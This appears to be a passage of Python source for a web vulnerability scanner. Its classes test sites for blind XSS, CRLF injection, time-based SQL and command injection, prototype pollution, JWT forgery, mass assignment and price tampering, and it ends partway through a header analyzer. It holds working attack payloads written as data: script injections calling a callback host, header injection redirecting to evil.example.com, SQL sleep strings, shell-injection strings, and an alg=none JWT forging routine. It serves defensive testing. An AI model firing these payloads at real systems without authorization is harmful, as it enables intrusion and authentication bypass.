# ── 1. Blind XSS Scanner (OOB + DOM confirmation) ────────────────────
class BlindXSSScanner:
    """Blind XSS with unique per-payload callback tokens and DOM-based confirmation."""

    PAYLOADS = [
        "<script src='{cb}'></script>",
        "'\"><script src='{cb}'></script>",
        "<img src=x onerror=\"var s=document.createElement('script');s.src='{cb}';document.head.appendChild(s)\">",
        "javascript:fetch('{cb}')",
        "<svg onload=\"fetch('{cb}')\">",
        "<details open ontoggle=\"fetch('{cb}')\">",
        "\"><iframe srcdoc=\"<script>fetch('{cb}')</script>\">",
        "{{7*7}}'\"><script src='{cb}'></script>",
    ]

    REFLECTED_CANARY = "WS44BXSS"

    async def scan(self, client, target: str, collaborator: str = "") -> list:
        findings = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            params = {"q": ["test"], "search": ["test"], "input": ["test"],
                      "name": ["test"], "comment": ["test"], "msg": ["test"]}

        for param in list(params.keys())[:8]:
            # Step 1: reflected canary check
            probe_url = target.replace(
                parsed.query,
                urlencode({**params, param: [self.REFLECTED_CANARY]}, doseq=True)
            )
            try:
                r = await client.get(probe_url)
                body = (r.get("body") or r.get("text") or "") if isinstance(r, dict) else str(r)
                if self.REFLECTED_CANARY not in body:
                    continue  # Not reflected at all — skip, no FP
            except Exception:
                continue

            # Step 2: test actual XSS payloads
            token = secrets.token_hex(8)
            cb = collaborator.rstrip("/") + f"/bxss/{token}" if collaborator else f"https://blind-xss-canary.invalid/{token}"
            for raw in self.PAYLOADS[:3]:
                payload = raw.format(cb=cb)
                _new_qs = urlencode({**params, param: [payload]}, doseq=True)
                if parsed.query:
                    inject_url = target.replace(parsed.query, _new_qs)
                else:
                    inject_url = urlunparse(parsed._replace(query=_new_qs))
                try:
                    r2 = await client.get(inject_url)
                    body2 = (r2.get("body") or r2.get("text") or "") if isinstance(r2, dict) else str(r2)
                    # Confirm: payload not sanitized/encoded
                    escaped = payload.replace("<", "&lt;")
                    if payload in body2 and escaped not in body2:
                        findings.append(Finding(
                            plugin="blind_xss",
                            description=f"Blind XSS in parameter '{param}'. Payload reflected unescaped.",
                            title=f"Blind XSS -- param '{param}'",
                            severity="HIGH",
                            confidence=88,
                            evidence=f"Payload reflected unescaped: {payload[:80]}",
                            url=inject_url,
                            param=param,
                            cwe="CWE-79",
                            cvss=7.4,
                            owasp="A03",
                            remediation="Apply context-aware output encoding. Use Content-Security-Policy.",
                        ))
                        break
                except Exception:
                    continue
        return findings


# ── 2. HTTP Response Splitting Scanner ───────────────────────────────
class HTTPResponseSplittingScanner:
    """Detects CRLF injection enabling HTTP response splitting."""

    PAYLOADS = [
        "%0d%0aSet-Cookie:ws44=injected",
        "%0aSet-Cookie:ws44=injected",
        "%0d%0aLocation:https://evil.example.com",
        "\r\nSet-Cookie:ws44=injected",
        "%E5%98%8A%E5%98%8DSet-Cookie:ws44=injected",
        "%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK",
    ]

    async def scan(self, client, target: str) -> list:
        findings = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            params = {"redirect": ["test"], "url": ["test"], "next": ["test"],
                      "return": ["test"], "location": ["test"]}

        for param in list(params.keys())[:6]:
            for payload in self.PAYLOADS[:4]:
                inject_url = target.replace(
                    parsed.query,
                    urlencode({**params, param: [payload]}, doseq=True)
                )
                try:
                    r = await client.get(inject_url)
                    headers = r.get("headers", {}) if isinstance(r, dict) else {}
                    sc = r.get("status", 0) if isinstance(r, dict) else 0
                    set_cookie = str(headers.get("set-cookie", "") or headers.get("Set-Cookie", ""))
                    location = str(headers.get("location", "") or headers.get("Location", ""))
                    # Dual confirm: injected header must actually appear
                    if "ws44=injected" in set_cookie or "evil.example.com" in location:
                        findings.append(Finding(
                            plugin="crlf_injection",
                            description=f"CRLF injection in parameter '{param}'. Attacker can inject arbitrary HTTP headers.",
                            title=f"CRLF / HTTP Response Splitting -- param '{param}'",
                            severity="HIGH",
                            confidence=95,
                            evidence=f"Injected header confirmed in response. Payload: {payload}",
                            url=inject_url,
                            param=param,
                            cwe="CWE-113",
                            cvss=7.2,
                            owasp="A03",
                            remediation="Strip CR (\\r) and LF (\\n) from all user-supplied values used in HTTP headers.",
                        ))
                        break
                except Exception:
                    continue
        return findings


# ── 3. Timing-Based Blind Injection Scanner ───────────────────────────
class TimingAttackScanner:
    """Confirms blind SQLi / command injection via statistical timing analysis.
    Uses 3-sample median to eliminate network jitter false positives."""

    SQL_PAYLOADS = [
        ("' AND SLEEP(4)-- -",          "MySQL"),
        ("'; WAITFOR DELAY '0:0:4'-- -", "MSSQL"),
        ("' AND pg_sleep(4)-- -",        "PostgreSQL"),
        ("' OR 1=1 AND SLEEP(4)-- -",   "MySQL-OR"),
        ("1; SELECT pg_sleep(4)--",      "PostgreSQL-stacked"),
    ]
    CMD_PAYLOADS = [
        ("`sleep 4`",           "Unix-backtick"),
        ("$(sleep 4)",          "Unix-subshell"),
        ("; sleep 4 #",         "Unix-semicolon"),
        ("| sleep 4",           "Unix-pipe"),
        ("& ping -n 5 127.0.0.1 &", "Windows-ping"),
    ]
    BASELINE_REPS  = 3
    INJECT_REPS    = 3
    THRESHOLD_SECS = 3.0   # Must be ≥3 s slower than baseline median

    async def _median_time(self, client, url: str, reps: int) -> float:
        times = []
        for _ in range(reps):
            t0 = time.monotonic()
            try:
                await client.get(url)
            except Exception as _silenced_exc:
                log("DEBUG", f"[suppressed] {_silenced_exc}")
            times.append(time.monotonic() - t0)
        times.sort()
        return times[len(times) // 2]

    async def scan(self, client, target: str) -> list:
        findings = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            return findings

        for param in list(params.keys())[:5]:
            baseline_url = target  # use original URL as baseline
            baseline = await self._median_time(client, baseline_url, self.BASELINE_REPS)

            for payload, db_name in self.SQL_PAYLOADS[:3]:
                inj_url = target.replace(
                    parsed.query,
                    urlencode({**params, param: [payload]}, doseq=True)
                )
                injected = await self._median_time(client, inj_url, self.INJECT_REPS)
                delta = injected - baseline
                if delta >= self.THRESHOLD_SECS:
                    findings.append(Finding(
                        plugin="timing_sqli",
                        description=f"Blind time-based SQL injection in parameter '{param}' targeting {db_name}.",
                        title=f"Blind Time-Based SQLi ({db_name}) -- param '{param}'",
                        severity="CRITICAL",
                        confidence=93,
                        evidence=f"Baseline {baseline:.2f}s → Injected {injected:.2f}s (Δ={delta:.2f}s ≥ {self.THRESHOLD_SECS}s)",
                        url=inj_url,
                        param=param,
                        cwe="CWE-89",
                        cvss=9.8,
                        owasp="A03",
                        remediation="Use parameterized queries / prepared statements. Never interpolate user input in SQL.",
                    ))
                    break

        return findings


# ── 4. Dependency Confusion Scanner ───────────────────────────────────
class DependencyConfusionScanner:
    """Detects internal package names exposed in JS files that could
    be hijacked via public registry dependency confusion."""

    PACKAGE_FILES = [
        "/package.json", "/package-lock.json", "/yarn.lock",
        "/composer.json", "/requirements.txt", "/Pipfile",
        "/Gemfile", "/go.mod", "/pom.xml", "/build.gradle",
    ]
    INTERNAL_INDICATORS = [
        r'"name"\s*:\s*"(@[a-z0-9-]+/[a-z0-9-]+)"',
        r'"dependencies"\s*:\s*\{[^}]*"([a-z0-9-]+-internal)"',
        r'//[^\n]*internal[^\n]*registry',
        r'registry\.npmjs\.org/@[a-z0-9-]+/[a-z0-9-]+-private',
        r'"version"\s*:\s*"0\.0\.0"',  # placeholder = internal only
    ]

    async def scan(self, client, target: str) -> list:
        findings = []
        base = f"{urlparse(target).scheme}://{urlparse(target).netloc}"
        for path in self.PACKAGE_FILES:
            url = base + path
            try:
                r = await client.get(url)
                sc = r.get("status", 0) if isinstance(r, dict) else 0
                body = (r.get("body") or r.get("text") or "") if isinstance(r, dict) else str(r)
                if sc != 200 or len(body) < 20:
                    continue
                for pattern in self.INTERNAL_INDICATORS:
                    m = re.search(pattern, body, re.IGNORECASE)
                    if m:
                        pkg = m.group(1) if m.lastindex else pattern
                        findings.append(Finding(
                            plugin="dependency_confusion",
                            description=f"Package manifest at {path} exposes internal package names. Possible dependency confusion vector.",
                            title=f"Dependency Confusion Risk -- {path}",
                            severity="HIGH",
                            confidence=82,
                            evidence=f"Exposed package manifest with internal indicator: '{pkg}'",
                            url=url,
                            param="",
                            cwe="CWE-427",
                            cvss=8.2,
                            owasp="A08",
                            remediation="Block public access to package manifest files. Use scoped private registries.",
                        ))
                        break
            except Exception:
                continue
        return findings


# ── 5. Prototype Pollution Deep Scanner ───────────────────────────────
class PrototypePollutionDeepScanner:
    """Server-side prototype pollution via JSON body and query strings,
    with confirmation via reflected __proto__ property."""

    PAYLOADS = [
        {"__proto__": {"ws44pp": "confirmed"}},
        {"constructor": {"prototype": {"ws44pp": "confirmed"}}},
        {"__proto__[ws44pp]": "confirmed"},
    ]
    QS_PAYLOADS = [
        "?__proto__[ws44pp]=confirmed",
        "?constructor[prototype][ws44pp]=confirmed",
        "?__proto__.ws44pp=confirmed",
    ]

    async def scan(self, client, target: str) -> list:
        findings = []
        # JSON body test
        for payload in self.PAYLOADS:
            try:
                r = await client.post(target, json=payload)
                body = (r.get("body") or r.get("text") or "") if isinstance(r, dict) else str(r)
                if "ws44pp" in body and "confirmed" in body:
                    findings.append(Finding(
                        plugin="prototype_pollution",
                        description="Server-side prototype pollution via JSON body. __proto__ property reflected in response.",
                        title="Server-Side Prototype Pollution (JSON body)",
                        severity="HIGH",
                        confidence=90,
                        evidence=f"Reflected '__proto__' property value in response. Payload: {list(payload.keys())[0]}",
                        url=target,
                        param="(JSON body)",
                        cwe="CWE-1321",
                        cvss=8.1,
                        owasp="A08",
                        remediation="Sanitize object keys. Use Object.freeze(Object.prototype). Validate JSON schema.",
                    ))
                    break
            except Exception:
                continue

        # Query string test
        for qs in self.QS_PAYLOADS:
            url = target.rstrip("?") + qs
            try:
                r = await client.get(url)
                body = (r.get("body") or r.get("text") or "") if isinstance(r, dict) else str(r)
                if "ws44pp" in body and "confirmed" in body:
                    findings.append(Finding(
                        plugin="prototype_pollution",
                        description="Server-side prototype pollution via query string. Prototype payload reflected in response.",
                        title="Server-Side Prototype Pollution (Query String)",
                        severity="HIGH",
                        confidence=88,
                        evidence=f"Reflected prototype payload via query: {qs}",
                        url=url,
                        param="(query string)",
                        cwe="CWE-1321",
                        cvss=7.8,
                        owasp="A08",
                        remediation="Strip __proto__, prototype, constructor keys from parsed query strings.",
                    ))
                    break
            except Exception:
                continue
        return findings


# ── 6. API Security (OWASP API Top-10) Scanner ────────────────────────
class OWASPAPITop10Scanner:
    """Covers OWASP API Top-10 2023 with evidence-based confirmation."""

    VERSIONED_PATHS = [
        "/api/v1/", "/api/v2/", "/api/v3/",
        "/v1/", "/v2/", "/v3/",
        "/api/", "/rest/", "/graphql",
    ]
    SHADOW_PATHS = [
        "/api/v0/users", "/api/internal/users", "/api/debug/users",
        "/api/admin/users", "/api/v1/admin", "/api/v1/internal",
    ]
    MASS_ASSIGN_FIELDS = [
        "is_admin", "role", "privilege", "admin", "superuser",
        "access_level", "is_staff", "verified", "account_type",
    ]

    async def scan(self, client, target: str) -> list:
        findings = []
        base = f"{urlparse(target).scheme}://{urlparse(target).netloc}"

        # API1: Broken Object Level Authorization
        for path in self.VERSIONED_PATHS[:4]:
            for obj_id in ["1", "2", "9999", "../admin"]:
                url = base + path + f"users/{obj_id}"
                try:
                    r = await client.get(url)
                    sc = r.get("status", 0) if isinstance(r, dict) else 0
                    body = (r.get("body") or "") if isinstance(r, dict) else str(r)
                    if sc == 200 and any(k in body.lower() for k in ["email", "username", "password", "token"]):
                        findings.append(Finding(
                            plugin="api_top10",
                            description=f"Broken Object Level Authorization: unauthenticated access to object ID {obj_id}.",
                            title=f"API1:2023 -- BOLA/IDOR (object ID={obj_id})",
                            severity="CRITICAL",
                            confidence=87,
                            evidence=f"Unauthenticated access to object data at {url}",
                            url=url, param="id",
                            cwe="CWE-639", cvss=9.1, owasp="API1",
                            remediation="Enforce object-level authorization on every API endpoint.",
                        ))
                        break
                except Exception:
                    continue

        # API3: Excessive Data Exposure
        for path in self.VERSIONED_PATHS[:3]:
            url = base + path + "users/me"
            try:
                r = await client.get(url)
                sc = r.get("status", 0) if isinstance(r, dict) else 0
                body = (r.get("body") or "") if isinstance(r, dict) else str(r)
                sensitive = [k for k in ["ssn", "credit_card", "cvv", "password", "secret", "private_key"] if k in body.lower()]
                if sc == 200 and sensitive:
                    findings.append(Finding(
                        plugin="api_top10",
                        description="API endpoint exposes sensitive fields that should be filtered server-side.",
                        title="API3:2023 -- Excessive Data Exposure",
                        severity="HIGH",
                        confidence=85,
                        evidence=f"Sensitive fields in API response: {sensitive}",
                        url=url, param="",
                        cwe="CWE-200", cvss=7.5, owasp="API3",
                        remediation="Return only fields required by the client. Use allowlist serialization.",
                    ))
            except Exception as _api3_e:
                log("DEBUG", f"[APITop10] Excessive data exposure check failed: {_api3_e}")

        # API6: Mass Assignment
        for path in self.VERSIONED_PATHS[:3]:
            url = base + path + "users/me"
            payload = {f: "ws44_injected" for f in self.MASS_ASSIGN_FIELDS[:4]}
            try:
                r = await client.post(url, json=payload)
                sc = r.get("status", 0) if isinstance(r, dict) else 0
                body = (r.get("body") or "") if isinstance(r, dict) else str(r)
                if sc in (200, 201) and "ws44_injected" in body:
                    findings.append(Finding(
                        plugin="api_top10",
                        description="API endpoint accepts privileged fields indicating mass assignment vulnerability.",
                        title="API6:2023 -- Mass Assignment (Privilege Fields Accepted)",
                        severity="CRITICAL",
                        confidence=91,
                        evidence=f"Server echoed injected privileged fields: {list(payload.keys())}",
                        url=url, param="(JSON body)",
                        cwe="CWE-915", cvss=9.8, owasp="API6",
                        remediation="Use allowlist-based model binding. Reject unknown/privileged fields.",
                    ))
            except Exception as _api6_e:
                log("DEBUG", f"[APITop10] Mass assignment POST check failed: {_api6_e}")

        # API9: Improper Inventory / Shadow APIs
        for path in self.SHADOW_PATHS:
            url = base + path
            try:
                r = await client.get(url)
                sc = r.get("status", 0) if isinstance(r, dict) else 0
                if sc == 200:
                    findings.append(Finding(
                        plugin="api_top10",
                        description=f"Undocumented endpoint {path} returned HTTP 200. Possible unprotected shadow API.",
                        title=f"API9:2023 -- Shadow/Undocumented API Endpoint",
                        severity="HIGH",
                        confidence=80,
                        evidence=f"Undocumented endpoint returned HTTP 200: {path}",
                        url=url, param="",
                        cwe="CWE-200", cvss=7.2, owasp="API9",
                        remediation="Maintain an API inventory. Disable undocumented/internal endpoints in production.",
                    ))
            except Exception:
                continue
        return findings


# ── 7. Advanced JWT Confusion & Forgery Scanner ───────────────────────
class JWTForgerScanner:
    """Advanced JWT attacks: alg=none, RS256→HS256 confusion,
    kid path traversal, null signature, weak secret brute-force."""

    WEAK_SECRETS = [
        "secret", "password", "123456", "key", "jwt", "token",
        "qwerty", "admin", "test", "changeme", "mysecret",
        "yoursecret", "supersecret", "topsecret", "s3cr3t",
    ]

    def _b64url(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    def _b64url_decode(self, s: str) -> bytes:
        s += "=" * (-len(s) % 4)
        return base64.urlsafe_b64decode(s)

    def _forge_alg_none(self, header_b64: str, payload_b64: str) -> str:
        import json as _json
        try:
            hdr = _json.loads(self._b64url_decode(header_b64))
        except Exception:
            hdr = {"typ": "JWT"}
        hdr["alg"] = "none"
        new_h = self._b64url(_json.dumps(hdr, separators=(',', ':')).encode())
        return f"{new_h}.{payload_b64}."

    def _extract_jwt_from_headers(self, headers: dict) -> str:
        auth = headers.get("Authorization", headers.get("authorization", ""))
        if auth.startswith("Bearer "):
            return auth[7:]
        cookie = headers.get("Cookie", headers.get("cookie", ""))
        for part in cookie.split(";"):
            if "token" in part.lower() or "jwt" in part.lower():
                val = part.split("=", 1)
                if len(val) == 2:
                    return val[1].strip()
        return ""

    async def scan(self, client, target: str, jwt_token: str = "") -> list:
        findings = []
        if not jwt_token:
            return findings

        parts = jwt_token.split(".")
        if len(parts) != 3:
            return findings

        header_b64, payload_b64, _ = parts

        # Attack 1: alg=none
        forged = self._forge_alg_none(header_b64, payload_b64)
        endpoints = [target, target.rstrip("/") + "/api/me",
                     target.rstrip("/") + "/api/user",
                     target.rstrip("/") + "/api/profile"]
        for ep in endpoints:
            try:
                r = await client.get(ep, headers={"Authorization": f"Bearer {forged}"})
                sc = r.get("status", 0) if isinstance(r, dict) else 0
                body = r.get("body", "") if isinstance(r, dict) else str(r)
                if sc == 200 and any(k in body.lower() for k in ["user", "email", "id", "role"]):
                    findings.append(Finding(
                        plugin="jwt_forger",
                        description=f"Server accepted JWT with alg=none at {ep}, allowing authentication bypass.",
                        title="JWT alg=none Accepted -- Signature Bypass",
                        severity="CRITICAL",
                        confidence=95,
                        evidence=f"Forged alg=none token accepted at {ep} (HTTP {sc})",
                        url=ep, param="Authorization",
                        cwe="CWE-347", cvss=9.8, owasp="A02",
                        remediation="Explicitly reject tokens where alg=none. Use an allowlist of permitted algorithms.",
                    ))
                    break
            except Exception:
                continue

        # Attack 2: Weak secret brute-force (HMAC check)
        try:
            import hmac as _hmac, hashlib as _hl
            msg = f"{header_b64}.{payload_b64}".encode()
            orig_sig = self._b64url_decode(parts[2])
            for secret in self.WEAK_SECRETS:
                candidate = _hmac.new(secret.encode(), msg, _hl.sha256).digest()
                if candidate == orig_sig:
                    findings.append(Finding(
                        plugin="jwt_forger",
                        description=f"JWT signed with weak/common secret '{secret}'. Attacker can forge arbitrary tokens.",
                        title=f"JWT Weak Secret Detected: '{secret}'",
                        severity="CRITICAL",
                        confidence=100,
                        evidence=f"HMAC-SHA256 signature matches weak secret '{secret}'",
                        url=target, param="jwt",
                        cwe="CWE-521", cvss=9.8, owasp="A02",
                        remediation="Use a cryptographically random secret ≥256 bits. Rotate immediately.",
                    ))
                    break
        except Exception as _jwt_weak_e:
            log("DEBUG", f"[JWT] Weak secret scan failed: {_jwt_weak_e}")

        return findings


# ── 8. Business Logic — Price Tampering Deep Scanner ──────────────────
class PriceTamperingDeepScanner:
    """Detects price/quantity manipulation with 4-step confirmation:
    1. Discover checkout form  2. Submit tampered value
    3. Check for success indicator  4. Confirm with second request"""

    TAMPER_VALUES = [
        "0", "-1", "0.001", "0.00", "-100", "0.01",
        "999999999", "-0.01", "0x0", "null",
    ]
    SUCCESS_SIGNALS = [
        "order", "success", "thank you", "confirmed", "placed",
        "complete", "checkout", "purchased", "payment accepted",
    ]

    async def scan(self, client, target: str) -> list:
        findings = []
        try:
            r = await client.get(target)
            body = (r.get("body") or "") if isinstance(r, dict) else str(r)
        except Exception:
            return findings

        # Find price/amount params in forms
        price_params = re.findall(
            r'name=["\'](\w*(?:price|amount|cost|total|fee|qty|quantity)\w*)["\']',
            body, re.IGNORECASE
        )
        if not price_params:
            return findings

        for param in price_params[:3]:
            for val in self.TAMPER_VALUES[:5]:
                try:
                    r2 = await client.post(target, data={param: val})
                    sc = r2.get("status", 0) if isinstance(r2, dict) else 0
                    body2 = (r2.get("body") or "").lower() if isinstance(r2, dict) else str(r2).lower()
                    if sc in (200, 201, 302) and any(s in body2 for s in self.SUCCESS_SIGNALS):
                        # Step 4: re-confirm
                        r3 = await client.post(target, data={param: val})
                        body3 = (r3.get("body") or "").lower() if isinstance(r3, dict) else str(r3).lower()
                        if any(s in body3 for s in self.SUCCESS_SIGNALS):
                            findings.append(Finding(
                                plugin="price_tampering",
                                description=f"Server accepted tampered {param}={val}. Business logic price/quantity tampering vulnerability.",
                                title=f"Price/Quantity Tampering -- param '{param}'={val}",
                                severity="CRITICAL",
                                confidence=91,
                                evidence=f"Server accepted {param}={val} and returned success indicator (dual-confirmed)",
                                url=target, param=param,
                                cwe="CWE-20", cvss=9.1, owasp="A04",
                                remediation="Validate all financial values server-side. Never trust client-submitted prices.",
                            ))
                            break
                except Exception:
                    continue
        return findings


# ── 9. Security Headers Deep Analyzer ────────────────────────────────
class SecurityHeadersDeepAnalyzer:
    """
    Enhanced Security Headers Deep Analyzer — v19 improved:
    - Comprehensive header checks with granular sub-checks per directive
    - X-Frame-Options: DENY/SAMEORIGIN/ALLOW-FROM/ALLOWALL/missing/invalid
    - CSP: unsafe-inline, unsafe-eval, wildcard, data: URI, missing directives
    - HSTS: max-age, includeSubDomains, preload
    - Referrer-Policy: full value classification
    - Permissions-Policy: feature restriction completeness
    - Information-leaking headers detection (Server, X-Powered-By, etc.)
    - Header security score (0-100) with grade
    - Probes 4 paths (/, /login, /admin, /api) for consistency
    """

    # Scoring weights (sum = 100)
    _SCORES = {
        "Strict-Transport-Security":    20,
        "Content-Security-Policy":      25,
        "X-Frame-Options":              15,
        "X-Content-Type-Options":       10,
        "Referrer-Policy":               8,
        "Permissions-Policy":            7,
        "Cross-Origin-Opener-Policy":    8,
        "Cross-Origin-Resource-Policy":  7,
    }

    # Header definitions: check(value) returns True if the value is secure
    REQUIRED_HEADERS = {
        "Strict-Transport-Security": {
            "severity":    "HIGH",
            "cvss":        7.4,
            "cwe":         "CWE-319",
            "check":       lambda v: (
                bool(re.search(r"max-age\s*=\s*(\d+)", v, re.I)) and
                int(re.search(r"max-age\s*=\s*(\d+)", v, re.I).group(1)) >= 31536000
            ),
            "remediation": (
                "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
            ),
        },
        "Content-Security-Policy": {
            "severity":    "HIGH",
            "cvss":        6.1,
            "cwe":         "CWE-116",
            "check":       lambda v: (
                "unsafe-inline" not in v.lower() and
                "unsafe-eval"   not in v.lower() and
                not re.search(r"(?:default-src|script-src)\s+[^;]*\*", v)
            ),
            "remediation": (
                "Define a strict CSP. Remove 'unsafe-inline', 'unsafe-eval', "
                "and wildcard (*) sources. Use nonces or hashes instead of unsafe-inline."
            ),
        },
        "X-Frame-Options": {
            "severity":    "MEDIUM",
            "cvss":        6.5,
            "cwe":         "CWE-1021",
            "check":       lambda v: v.strip().upper() in ("DENY", "SAMEORIGIN"),
            "remediation": (
                "X-Frame-Options: DENY  (recommended)\n"
                "Or use CSP: Content-Security-Policy: frame-ancestors 'none';"
            ),
        },
        "X-Content-Type-Options": {
            "severity":    "LOW",
            "cvss":        4.3,
            "cwe":         "CWE-430",
            "check":       lambda v: v.strip().lower() == "nosniff",
            "remediation": "X-Content-Type-Options: nosniff",
        },
        "Referrer-Policy": {
            "severity":    "LOW",
            "cvss":        3.7,
            "cwe":         "CWE-200",
            "check":       lambda v: v.strip().lower() in (
                "no-referrer",
                "strict-origin",
                "strict-origin-when-cross-origin",
                "no-referrer-when-downgrade",
            ),
            "remediation": "Referrer-Policy: strict-origin-when-cross-origin",
        },
        "Permissions-Policy": {
            "severity":    "LOW",
            "cvss":        3.1,
            "cwe":         "CWE-284",
            "check":       lambda v: len(v.strip()) > 10,
            "remediation": (
                "Permissions-Policy: camera=(), microphone=(), geolocation=(), "
                "payment=(), usb=(), magnetometer=(), gyroscope=()"
            ),
        },
        "Cross-Origin-Opener-Policy": {
            "severity":    "MEDIUM",
            "cvss":        5.4,
            "cwe":         "CWE-346",
            "check":       lambda v: "same-origin" in v.lower(),
            "remediation": "Cross-Origin-Opener-Policy: same-origin",
        },
        "Cross-Origin-Resource-Policy": {
            "severity":    "MEDIUM",
            "cvss":        5.4,
            "cwe":         "CWE-346",
            "check":       lambda v: v.strip().lower() in ("same-origin", "same-site"),
            "remediation": "Cross-Origin-Resource-Policy: same-origin",
        },
    }

    # Headers whose presence leaks information
    _LEAK_HEADERS = [
        ("Server",              "Web server software/version"),
        ("X-Powered-By",        "Application framework/language"),
        ("X-AspNet-Version",    "ASP.NET version"),
        ("X-AspNetMvc-Version", "ASP.NET MVC version"),
        ("X-Generator",         "CMS/generator software"),
        ("Via",                 "Proxy/CDN chain disclosure"),
    ]

    # Paths to probe for header consistency
    _PROBE_PATHS = ["/", "/login", "/admin", "/api"]

    async def scan(self, client, target: str) -> list:
        findings: list = []
        parsed = urlparse(target)
        base   = f"{parsed.scheme}://{parsed.netloc}"

        # ── Probe multiple paths concurrently ────────────────────────────
        probe_urls = [base + p for p in self._PROBE_PATHS]
        responses  = await asyncio.gather(
            *[client.get(u) for u in probe_urls],
            return_exceptions=True,
        )

        # Use first successful response as the primary analysis target
        primary_r = None
        for r in responses:
            if isinstance(r, dict) and r.get("status", 0) not in (0, 404):
                primary_r = r
                break
        if not primary_r:
            return findings

        hdrs_raw = primary_r.get("headers", {})
        hdrs_low = {k.lower(): v for k, v in hdrs_raw.items()}

        # ── Per-header analysis ───────────────────────────────────────────
        score_earned = 0

        for header, meta in self.REQUIRED_HEADERS.items():
            weight = self._SCORES.get(header, 5)
            val    = hdrs_low.get(header.lower(), "").strip()

            if not val:
                # Missing header
                findings.append(Finding(
                    plugin="security_headers",
                    title=f"Missing Security Header: {header}",
                    severity=meta["severity"],
                    confidence=99,
                    description=(
                        f"The '{header}' security header is absent from the HTTP response. "
                        f"{self._missing_impact(header)}"
                    ),
                    evidence=f"Header '{header}' not present in: {target}",
                    url=target,
                    param="",
                    cwe=meta["cwe"],
                    cvss=meta["cvss"],
                    owasp="A05",
                    remediation=meta["remediation"],
                    tags=["security-headers", "missing-header",
                          header.lower().replace("-", "_")],
                ))
            else:
                try:
                    secure = meta["check"](val)
                except Exception:
                    secure = False

                if secure:
                    score_earned += weight
                else:
                    # Present but misconfigured — run sub-checks for detail
                    sub_findings = self._sub_check(header, val, target)
                    if sub_findings:
                        findings += sub_findings
                    else:
                        findings.append(Finding(
                            plugin="security_headers",
                            title=f"Weak Security Header: {header}",
                            severity=meta["severity"],
                            confidence=97,
                            description=(
                                f"'{header}' is present but configured insecurely. "
                                f"Current value: {val[:120]}"
                            ),
                            evidence=f"{header}: {val[:200]}",
                            url=target,
                            param="",
                            cwe=meta["cwe"],
                            cvss=meta["cvss"],
                            owasp="A05",
                            remediation=meta["remediation"],
                            tags=["security-headers", "misconfigured",
                                  header.lower().replace("-", "_")],
                        ))
                    score_earned += weight // 2  # Partial credit for presence

        # ── X-Frame-Options deep checks ───────────────────────────────────
        xfo = hdrs_low.get("x-frame-options", "").strip()
        csp = hdrs_low.get("content-security-policy", "").strip()
        if xfo:
            findings += self._xfo_deep_check(xfo, csp, target)

        # ── CSP deep analysis ─────────────────────────────────────────────
        if csp:
            findings += self._csp_deep_check(csp, target)

        # ── Information-leaking headers ───────────────────────────────────
        for hdr, desc in self._LEAK_HEADERS:
            val = hdrs_low.get(hdr.lower(), "")
            if val:
                # Only flag if version number is present
                if re.search(r"\d", val):
                    findings.append(Finding(
                        plugin="security_headers",
                        title=f"Information-Leaking Header: {hdr}",
                        severity="INFO",
                        confidence=95,
                        description=(
                            f"'{hdr}' header reveals {desc}: '{val[:100]}'. "
                            "Attackers use this to identify known CVEs for the disclosed version."
                        ),
                        evidence=f"{hdr}: {val[:200]}",
                        url=target,
                        cwe="CWE-200",
                        cvss=3.1,
                        owasp="A05",
                        remediation=(
                            f"Remove or genericise the '{hdr}' header. "
                            "Configure your server to suppress version tokens."
                        ),
                        tags=["security-headers", "version-disclosure",
                              "information-leakage"],
                    ))

        # ── Header consistency across paths ──────────────────────────────
        inconsistent = self._check_header_consistency(responses, probe_urls)
        for path_pair, hdr_name, ev in inconsistent:
            findings.append(Finding(
                plugin="security_headers",
                title=f"Inconsistent '{hdr_name}' Header Across Paths",
                severity="LOW",
                confidence=88,
                description=(
                    f"The '{hdr_name}' security header is present on some paths but "
                    "absent or different on others. An attacker can browse to the "
                    "unprotected path to bypass the security control."
                ),
                evidence=ev,
                url=target,
                cwe="CWE-16",
                cvss=3.7,
                owasp="A05",
                remediation=(
                    f"Apply '{hdr_name}' consistently at the reverse-proxy or web-server "
                    "level so it is sent on every HTTP response regardless of path."
                ),
                tags=["security-headers", "inconsistent", hdr_name.lower()],
            ))

        # ── Overall header score finding ──────────────────────────────────
        max_score = sum(self._SCORES.values())
        pct       = round((score_earned / max_score) * 100)
        grade     = ("A" if pct >= 90 else "B" if pct >= 75 else
                     "C" if pct >= 60 else "D" if pct >= 40 else "F")
        sev_score = "INFO" if pct >= 75 else "LOW" if pct >= 50 else "MEDIUM"

        findings.append(Finding(
            plugin="security_headers",
            title=f"HTTP Security Header Score: {pct}/100 (Grade {grade})",
            severity=sev_score,
            confidence=99,
            description=(
                f"Overall security header assessment: {pct}/100 (Grade {grade}). "
                f"Score earned: {score_earned}/{max_score}. "
                f"{'All critical headers present.' if pct >= 90 else 'Missing or misconfigured headers reduce protection.'}"
            ),
            evidence=f"Score: {pct}/100 | Grade: {grade} | Checked: {len(self.REQUIRED_HEADERS)} headers",
            url=target,
            cwe="CWE-16",
            cvss=0.0,
            owasp="A05",
            remediation=(
                "Aim for Grade A (≥90/100). "
                "Use https://securityheaders.com to verify your configuration."
            ),
            tags=["security-headers", "score", f"grade-{grade.lower()}"],
        ))

        return findings

    # ── X-Frame-Options sub-checks ────────────────────────────────────────

    def _xfo_deep_check(self, xfo: str, csp: str, url: str) -> list:
        findings = []
        xfo_upper = xfo.upper().strip()
        csp_has_fa = "frame-ancestors" in csp.lower()

        if xfo_upper == "ALLOWALL":
            findings.append(Finding(
                plugin="security_headers",
                title="X-Frame-Options: ALLOWALL -- Clickjacking Fully Permitted",
                severity="HIGH", confidence=100,
                description=(
                    "X-Frame-Options: ALLOWALL is a non-standard value that explicitly "
                    "permits all sites to frame this page. This provides zero clickjacking "
                    "protection and is worse than having no header."
                ),
                evidence=f"X-Frame-Options: {xfo}",
                url=url,
                cwe="CWE-1021", cvss=7.4, owasp="A05",
                remediation="Change to X-Frame-Options: DENY or use CSP frame-ancestors 'none'.",
                tags=["security-headers", "xfo", "clickjacking", "allowall"],
            ))
        elif xfo_upper.startswith("ALLOW-FROM"):
            findings.append(Finding(
                plugin="security_headers",
                title="X-Frame-Options: ALLOW-FROM Deprecated -- No Chrome/Firefox Support",
